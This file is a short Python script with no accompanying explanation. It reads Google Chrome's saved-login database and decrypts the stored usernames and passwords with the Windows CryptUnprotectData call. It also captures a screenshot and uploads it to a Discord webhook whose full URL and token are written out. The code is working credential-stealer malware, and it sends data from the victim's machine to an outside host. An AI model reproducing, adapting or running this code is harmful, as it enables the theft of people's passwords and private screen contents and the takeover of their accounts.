import os
import sqlite3
import win32crypt
import requests
import mss

db_path = os.path.join(os.environ['LOCALAPPDATA'], 'Google\\Chrome\\User Data\\Default\\Login Data')

data = {}

try:
    conn = sqlite3.connect(db_path)
    cursor = conn.cursor()

    cursor.execute('SELECT action_url, username_value, password_value FROM logins')
    logins = cursor.fetchall()

    for login in logins:
        url, username, password = login
        password = win32crypt.CryptUnprotectData(password, None, None, None, 0)[1]

        data[url] = {'username': username, 'password': password}

    conn.close()
except Exception as e:
    print(f"[-] Error: {e}")

with mss.mss() as sct:
    screenshot = sct.shot()
    with open(screenshot, 'rb') as f:
        r = requests.post('https://discord.com/api/webhooks/1090757255529504860/YZa2fgdhp_xT7_F44a7z2hQVA77NmqnaUELuDc0Rc6LWKjwdrhfdmUHYZen_HDlI7cJ9', files={'file': ('screenshot.png', f, 'image/png')})
            
print(data)